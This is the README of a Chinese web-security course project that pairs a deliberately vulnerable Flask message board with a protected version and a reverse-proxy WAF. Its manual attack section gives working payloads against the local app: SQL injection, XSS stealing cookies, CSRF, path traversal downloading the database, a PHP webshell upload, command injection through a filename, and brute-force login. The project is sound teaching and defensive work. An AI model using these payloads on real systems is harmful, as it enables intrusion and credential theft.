# allweb-defense

Web 应用通用漏洞分析与防御课程设计项目。实现了一个留言板系统的漏洞版与防护版，并附带独立的反向代理 WAF，演示 10 类常见 Web 攻击及其防御方案。

## 项目结构

```
allweb-defense/
├── app/
│   ├── vulnerable/     # 漏洞版 Flask 应用（端口 5000）
│   └── protected/      # 防护版 Flask 应用（端口 5001）
├── shared/
│   └── templates/      # 两个应用共用的 HTML 模板
├── waf/                # 独立反向代理 WAF（端口 8080）
│   ├── proxy.py        # aiohttp 异步代理主入口
│   ├── detector.py     # 纯函数检测/净化库
│   ├── config.py       # 配置加载（YAML + CLI）
│   └── config.yaml     # 默认配置
├── attacks/            # 攻击演示脚本
├── tests/              # 自动化测试
├── init_db.py          # 数据库初始化
└── requirements.txt
```

## 快速开始

### 安装依赖

```bash
pip install -r requirements.txt
```

### 初始化数据库

```bash
python init_db.py
```

### 启动应用

**漏洞版**（用于演示攻击）：

```bash
python app/vulnerable/app.py
# 访问 http://127.0.0.1:5000
```

**防护版**（Flask 内嵌通防中间件）：

```bash
python app/protected/app.py
# 访问 http://127.0.0.1:5001
```

**WAF 反向代理**（代理式通防，保护漏洞版后端）：

```bash
# 先启动漏洞版后端
python app/vulnerable/app.py

# 再启动 WAF 代理
python -m waf
# 访问 http://127.0.0.1:8080（流量经 WAF 过滤后转发到 5000）
```

WAF 支持命令行参数覆盖配置：

```bash
python -m waf --listen 8080 --backend http://127.0.0.1:5000
```

## 防御能力对比

| 防御方式 | 实现位置 | 适用场景 |
|---------|---------|---------|
| 绑定式通防 | `app/protected/middleware.py` | 与 Flask 应用耦合，仅保护 Python/Flask 后端 |
| 代理式通防 | `waf/` | 独立进程，语言无关，可保护任意 HTTP 后端 |

## WAF 检测规则

| 规则 | 触发条件 | 响应 |
|------|---------|------|
| SQL 注入 | GET/POST 参数含 SQL 关键字 | 403 |
| 路径穿越 | 参数含 `../` 或其编码变体 | 403 |
| 命令注入 | 参数含 `;` `&&` `\|` `` ` `` `$(` | 403 |
| 非法文件扩展名 | 上传文件不在 `.jpg/.jpeg/.png/.gif` 白名单 | 400 |
| 频率限制 | 同一 IP 对 `/login` POST 超过阈值次数 | 429 |
| XSS 净化 | 参数含 `<script>` `javascript:` `on*=` | HTML 实体编码后转发，不拦截 |
| 安全响应头 | 所有响应 | 注入 CSP、X-Frame-Options 等 5 个安全头 |

所有拦截和净化事件写入 `security.log`。

## WAF 配置

编辑 `waf/config.yaml`：

```yaml
listen_port: 8080
backend_url: "http://127.0.0.1:5000"
login_path: "/login"
rules:
  sql_injection: true
  xss: true
  path_traversal: true
  cmd_injection: true
  rate_limit: true
  file_upload: true
  security_headers: true
rate_limit:
  max_failures: 10   # 窗口内最大失败次数
  window: 60         # 时间窗口（秒）
  lockout: 300       # 锁定时长（秒）
log_path: "security.log"
```

禁用单项规则：

```bash
python -m waf --disable sql_injection
```

## 攻击演示脚本

脚本默认打漏洞版（端口 5000），可改端口验证防护效果。

| 脚本 | 演示攻击 |
|------|---------|
| `attacks/sql_injection.py` | 登录绕过、UNION 数据泄露 |
| `attacks/xss_demo.py` | 存储型 / 反射型 XSS |
| `attacks/csrf_demo.html` | 跨站请求伪造（在浏览器中打开） |
| `attacks/path_traversal.py` | 路径穿越读取任意文件 |
| `attacks/cmd_injection.py` | 命令注入执行系统命令 |
| `attacks/privilege_escalation.py` | 水平 / 垂直越权 |
| `attacks/brute_force.py` | 暴力破解登录（对比频率限制效果） |

## 运行测试

```bash
python -m pytest tests/test_detector.py -v
```

## 技术栈

- Python 3.12
- Flask 3.1.2（漏洞版 / 防护版应用）
- aiohttp 3.9.5（WAF 反向代理）
- PyYAML 6.0.2（WAF 配置）
- pytest 8.4.2（单元测试）

## 手动攻击方法

以下所有攻击均针对**漏洞版**（`http://127.0.0.1:5000`）。启动前先运行 `python init_db.py` 初始化数据库。

测试账号：
- `admin` / `admin123`（管理员）
- `alice` / `alice123`（普通用户）
- `bob` / `bob123`（普通用户）

---

### 1. SQL 注入

#### 1a. 登录绕过

**前置条件**：漏洞版运行中，无需已有账号

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/login
2. 用户名填入：`' OR '1'='1' --`
3. 密码随意填写（如 `x`）
4. 点击登录

**curl**：
```bash
curl -c cookies.txt -d "username=' OR '1'='1' --&password=x" \
  http://127.0.0.1:5000/login -L -v 2>&1 | grep -E "Location|302|200"
```

**预期结果**：绕过密码验证，以数据库第一个用户身份登录成功，跳转到留言板。

---

#### 1b. UNION 数据泄露

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问搜索页，在搜索框输入：
   ```
   %' UNION SELECT id,username,password,filepath,created_at,user_id FROM users --
   ```
2. 点击 SEARCH

**curl**：
```bash
curl -b cookies.txt \
  "http://127.0.0.1:5000/search?q=%25%27+UNION+SELECT+id%2Cusername%2Cpassword%2Cfilepath%2Ccreated_at%2Cuser_id+FROM+users+--"
```

**预期结果**：页面返回 users 表中所有用户的用户名和 MD5 密码哈希。

---

### 2. 存储型 XSS

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/messages
2. 在留言框输入：
   ```html
   <script>alert('XSS: ' + document.cookie)</script>
   ```
3. 点击 PUBLISH
4. 页面刷新后弹出 alert

**curl**（提交 payload）：
```bash
curl -b cookies.txt \
  -d "content=<script>alert('XSS: '+document.cookie)</script>" \
  http://127.0.0.1:5000/messages -L
```

**预期结果**：留言保存后，每次访问留言板都会弹出包含 cookie 的 alert 弹窗（持久化）。

---

### 3. 反射型 XSS

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 直接访问以下 URL（或在搜索框输入 payload 后提交）：
   ```
   http://127.0.0.1:5000/search?q=<script>alert('reflected XSS')</script>
   ```

**curl**：
```bash
curl -b cookies.txt \
  "http://127.0.0.1:5000/search?q=<script>alert('reflected+XSS')</script>"
```

**预期结果**：页面直接将 `<script>` 标签渲染到 HTML，浏览器执行并弹出 alert。

---

### 4. CSRF（跨站请求伪造）

**前置条件**：alice 已在浏览器中登录漏洞版

**步骤**：
1. 用文本编辑器打开 `attacks/csrf_demo.html`，确认 `action` 指向 `http://127.0.0.1:5000/settings`
2. 在**同一浏览器**中打开该 HTML 文件（`file://` 协议）
3. 页面自动提交表单，将 alice 的密码改为 `hacked`

**curl 等价**（模拟跨站请求，无 CSRF token）：
```bash
curl -b cookies.txt \
  -d "new_password=hacked&confirm_password=hacked" \
  http://127.0.0.1:5000/settings -L
```

**预期结果**：alice 密码被修改为 `hacked`，原密码 `alice123` 失效。

---

### 5. 路径穿越

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问：
   ```
   http://127.0.0.1:5000/download?filename=../app.db
   ```

**curl**：
```bash
curl -b cookies.txt \
  "http://127.0.0.1:5000/download?filename=../app.db" -o stolen.db
# 验证：
python -c "import sqlite3; db=sqlite3.connect('stolen.db'); print(db.execute('SELECT username,password FROM users').fetchall())"
```

**预期结果**：成功下载 `app.db` 数据库文件，包含所有用户密码哈希。

---

### 6. 水平越权（删除他人留言）

> **注意**：此漏洞在当前版本中已被重构为垂直越权演示（见第 7 条）。水平越权的核心是"普通用户删除他人留言"，可通过垂直越权步骤同时演示。

**前置条件**：alice 已登录，bob 有留言存在

**curl**：
```bash
# 以 alice 登录
curl -c cookies_alice.txt -d "username=alice&password=alice123" \
  http://127.0.0.1:5000/login -L

# 查询 bob 的留言 ID（从页面源码或数据库获取）
python -c "import sqlite3; db=sqlite3.connect('app.db'); db.row_factory=sqlite3.Row; [print(r['id'], r['username']) for r in db.execute('SELECT id,username FROM messages')]"

# alice 删除 bob 的留言（假设 bob 的留言 ID 为 2）
curl -b cookies_alice.txt -d "msg_id=2" \
  http://127.0.0.1:5000/messages/delete -L
```

**预期结果**：alice 成功删除 bob 的留言，无任何权限报错。

---

### 7. 垂直越权

#### 7a. 普通用户删除留言（绕过 admin-only 限制）

**前置条件**：alice 已登录，页面上无 DELETE 按钮

**curl**：
```bash
# 以 alice 登录
curl -c cookies_alice.txt -d "username=alice&password=alice123" \
  http://127.0.0.1:5000/login -L

# 直接 POST 删除接口（绕过 UI 限制）
curl -b cookies_alice.txt -d "msg_id=1" \
  http://127.0.0.1:5000/messages/delete -L
```

**预期结果**：后端无角色校验，删除成功（HTTP 302 跳转回留言板）。

---

#### 7b. 普通用户访问 admin 管理页面

**前置条件**：alice 已登录

**浏览器步骤**：
1. 直接访问 http://127.0.0.1:5000/admin/users

**curl**：
```bash
curl -b cookies_alice.txt http://127.0.0.1:5000/admin/users
```

**预期结果**：返回用户管理页面，列出所有用户（无角色校验）。

---

### 8. 不安全文件上传

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/upload
2. 选择一个 `.php` 或 `.py` 文件上传
3. 上传成功，无扩展名校验

**curl**：
```bash
# 创建测试 webshell 文件
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 上传
curl -b cookies.txt \
  -F "file=@shell.php;type=application/octet-stream" \
  http://127.0.0.1:5000/upload -L
```

**预期结果**：服务器接受 `.php` 文件上传，返回成功响应（无扩展名白名单校验）。

---

### 9. 命令注入

**前置条件**：以 admin 账号登录

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/admin/messages
2. 在文件名输入框中输入：
   ```
   msg_1_admin.txt; whoami > /tmp/pwned.txt
   ```
3. 点击删除

**curl**：
```bash
# 以 admin 登录
curl -c cookies_admin.txt -d "username=admin&password=admin123" \
  http://127.0.0.1:5000/login -L

# 注入命令（Windows 用 & 替代 ;）
curl -b cookies_admin.txt \
  -d "filename=msg_1_admin.txt & whoami" \
  http://127.0.0.1:5000/admin/messages/delete -L
```

**预期结果**：服务器执行 `rm messages/msg_1_admin.txt & whoami`，注入的命令被执行（可在响应或服务器日志中观察到）。

---

### 10. 暴力破解

**前置条件**：漏洞版运行中，知道目标用户名（如 `admin`）

**curl 循环**：
```bash
# 尝试常见密码列表
for pwd in password 123456 admin admin123 qwerty letmein; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    -d "username=admin&password=$pwd" \
    http://127.0.0.1:5000/login)
  echo "$pwd -> HTTP $result"
  # HTTP 302 表示登录成功
done
```

**Python 脚本方式**：
```bash
python attacks/brute_force.py
```

**预期结果**：漏洞版无频率限制，可无限尝试。当密码为 `admin123` 时返回 HTTP 302（登录成功）。防护版在超过阈值后返回 HTTP 429。
